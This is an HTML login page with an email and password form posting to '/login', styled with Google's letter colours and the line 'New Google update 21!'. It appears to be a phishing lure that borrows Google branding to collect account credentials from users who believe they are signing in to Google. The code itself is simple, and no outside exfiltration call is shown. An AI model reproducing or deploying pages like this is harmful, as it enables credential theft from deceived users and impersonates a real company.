<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
        }
        .login-container h2 {
            margin-bottom: 5px;
        }
        .login-container p.small-text {
            margin-top: 0;
            margin-bottom: 20px;
            color: #666;
            font-size: 0.9em;
        }
        .login-container .google-text {
            display: inline-flex;
            gap: 0; /* Remove any space between letters */
        }
        .login-container .google-text span {
            font-weight: bold;
            line-height: 1;
        }
        .google-blue {
            color: #4285F4;
        }
        .google-red {
            color: #DB4437;
        }
        .google-yellow {
            color: #F4B400;
        }
        .google-green {
            color: #0F9D58;
        }
        .login-container input[type="email"],
        .login-container input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
        .login-container button {
            background-color: #4c63af;
            color: white;
            padding: 10px 15px;
            margin: 10px 0;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
        }
        .login-container button:hover {
            background-color: #3b4a8b;
        }
        .error-message {
            color: red;
            font-size: 0.9em;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Login</h2>
        <p class="small-text">
            New <span class="google-text">
                <span class="google-blue">G</span>
                <span class="google-red">o</span>
                <span class="google-yellow">o</span>
                <span class="google-blue">g</span>
                <span class="google-green">l</span>
                <span class="google-red">e</span>
            </span> update 21!
        </p>
        <form id="loginForm" action="/login" method="POST">
            <div>
                <input type="email" id="email" name="email" placeholder="Email" required>
            </div>
            <div>
                <input type="password" id="password" name="password" placeholder="Password" required>
            </div>
            <div>
                <button type="submit">Login</button>
            </div>
            <div id="error-message" class="error-message"></div>
        </form>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();
            const errorMessage = document.getElementById('error-message');
            
            if (!email || !password) {
                errorMessage.textContent = 'Both email and password are required!';
                event.preventDefault(); // Prevent form submission
            } else {
                errorMessage.textContent = ''; // Clear any previous error message
            }
        });
    </script>
</body>
</html>
